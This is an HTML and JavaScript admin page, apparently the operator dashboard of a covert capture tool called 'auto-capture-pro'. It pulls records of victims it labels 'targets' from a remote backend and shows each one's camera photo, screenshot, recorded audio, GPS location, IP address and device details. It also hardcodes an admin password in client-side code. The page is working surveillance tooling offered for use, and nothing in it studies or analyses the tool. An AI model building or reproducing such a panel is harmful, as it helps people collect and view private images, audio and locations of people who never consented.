<!DOCTYPE html>
<html>
<head>
    <title>🔐 ADMIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
        .container { max-width: 1200px; margin: auto; }
        .login-box { background: #111; border: 2px solid #00ff41; padding: 40px; max-width: 350px; margin: 50px auto; text-align: center; }
        .login-box input, .login-box button { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #00ff41; color: #00ff41; }
        .login-box button { background: #00ff41; color: #000; font-weight: bold; cursor: pointer; }
        .gallery { display: none; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .card { background: #111; border: 1px solid #00ff41; border-radius: 8px; overflow: hidden; }
        .card img { width: 100%; height: 150px; object-fit: cover; }
        .card .info { padding: 12px; }
        .card .info .del { background: #ff0040; color: #fff; border: none; padding: 5px 12px; cursor: pointer; }
        .loading, .no-data { text-align: center; padding: 40px; }
        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        .header button { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 8px 16px; cursor: pointer; }
        .lightbox { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 999; }
        .lightbox img { max-width: 90%; max-height: 90%; border: 2px solid #00ff41; }
        .lightbox .close { position: absolute; top: 20px; right: 40px; color: #00ff41; font-size: 40px; cursor: pointer; }
        .audio-player { margin-top: 8px; background: #000; padding: 8px; }
        .audio-player audio { width: 100%; }
    </style>
</head>
<body>
<div class="container">

<div class="lightbox" id="lightbox">
    <span class="close" onclick="closeLightbox()">✕</span>
    <img id="lightboxImg" src="" />
</div>

<div class="login-box" id="loginBox">
    <h2>🔐 ADMIN</h2>
    <input type="password" id="passwordInput" placeholder="PASSWORD" />
    <button onclick="login()">UNLOCK</button>
    <div id="loginError" style="color:#ff0040; margin-top:10px;"></div>
</div>

<div class="gallery" id="gallery">
    <div class="header">
        <h2>📊 DATABASE</h2>
        <div>
            <span id="total">0</span> targets
            <button onclick="loadData()">🔄 REFRESH</button>
            <button onclick="logout()" style="border-color:#ff0040; color:#ff0040;">🚪 EXIT</button>
        </div>
    </div>
    <div class="grid" id="grid"><div class="loading">⏳ LOADING...</div></div>
</div>

<script>
const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
const PASSWORD = 'admin123#@!';

function login() {
    const pwd = document.getElementById('passwordInput').value;
    const err = document.getElementById('loginError');
    if (pwd === PASSWORD) {
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('gallery').style.display = 'block';
        err.textContent = '';
        loadData();
    } else {
        err.textContent = '⛔ WRONG PASSWORD!';
        document.getElementById('passwordInput').value = '';
    }
}

function logout() {
    document.getElementById('loginBox').style.display = 'block';
    document.getElementById('gallery').style.display = 'none';
    document.getElementById('passwordInput').value = '';
    document.getElementById('loginError').textContent = '';
}

function openLightbox(src) {
    document.getElementById('lightboxImg').src = src;
    document.getElementById('lightbox').style.display = 'flex';
}

function closeLightbox() {
    document.getElementById('lightbox').style.display = 'none';
}

async function loadData() {
    const grid = document.getElementById('grid');
    const total = document.getElementById('total');
    grid.innerHTML = '<div class="loading">⏳ LOADING...</div>';
    
    try {
        const res = await fetch(BACKEND_URL + '/api/admin/get-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: PASSWORD })
        });
        
        if (!res.ok) {
            const text = await res.text();
            console.error('Server Error:', text);
            throw new Error('HTTP ' + res.status);
        }
        
        const data = await res.json();
        console.log('Data received:', data);
        
        if (!data.success) {
            grid.innerHTML = '<div class="no-data">⛔ ' + data.message + '</div>';
            return;
        }
        
        total.textContent = data.count || 0;
        if (!data.data || data.data.length === 0) {
            grid.innerHTML = '<div class="no-data">📭 NO DATA</div>';
            return;
        }
        
        grid.innerHTML = '';
        data.data.forEach(item => {
            const card = document.createElement('div');
            card.className = 'card';
            
            const photo = item.userPhoto || item.cameraImage || 'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%23000%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2250%22 text-anchor=%22middle%22 fill=%22%2300ff41%22 font-size=%2220%22>📸</text></svg>';
            const screenshot = item.screenshot || 'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%23000%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2250%22 text-anchor=%22middle%22 fill=%22%2300ff41%22 font-size=%2220%22>🖼️</text></svg>';
            
            let audio = '';
            if (item.audioData && item.audioData !== 'null') {
                audio = `<div class="audio-player"><audio controls><source src="${item.audioData}" type="audio/webm"></audio></div>`;
            }
            
            card.innerHTML = `
                <div style="display:grid; grid-template-columns:1fr 1fr;">
                    <img src="${photo}" onclick="openLightbox('${photo}')" />
                    <img src="${screenshot}" onclick="openLightbox('${screenshot}')" />
                </div>
                <div class="info">
                    <div>📍 ${item.location?.lat?.toFixed(4) || 0}, ${item.location?.lng?.toFixed(4) || 0}</div>
                    <div>🕐 ${new Date(item.timestamp).toLocaleString()}</div>
                    <div>📱 ${item.deviceDetails?.deviceName || 'Unknown'}</div>
                    <div>📡 IP: ${item.ipAddress || 'Unknown'}</div>
                    <div>🚀 Speed: ${item.networkSpeed?.download || '--'} Mbps</div>
                    <div>📸 Captures: ${item.captureCount || 1}</div>
                    ${audio}
                    <button class="del" onclick="deleteData('${item._id}')">🗑️ DELETE</button>
                </div>
            `;
            grid.appendChild(card);
        });
        
    } catch(err) {
        console.error('Error:', err);
        grid.innerHTML = '<div class="no-data">❌ ERROR: ' + err.message + '</div>';
    }
}

async function deleteData(id) {
    if (!confirm('Delete?')) return;
    try {
        const res = await fetch(BACKEND_URL + '/api/admin/delete', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: PASSWORD, id })
        });
        const data = await res.json();
        if (data.success) loadData();
        else alert('Error: ' + data.message);
    } catch(err) {
        alert('Error: ' + err.message);
    }
}

document.getElementById('passwordInput').addEventListener('keypress', e => {
    if (e.key === 'Enter') login();
});

console.log('🔐 ADMIN LOADED, BACKEND:', BACKEND_URL);
</script>
</body>
</html>
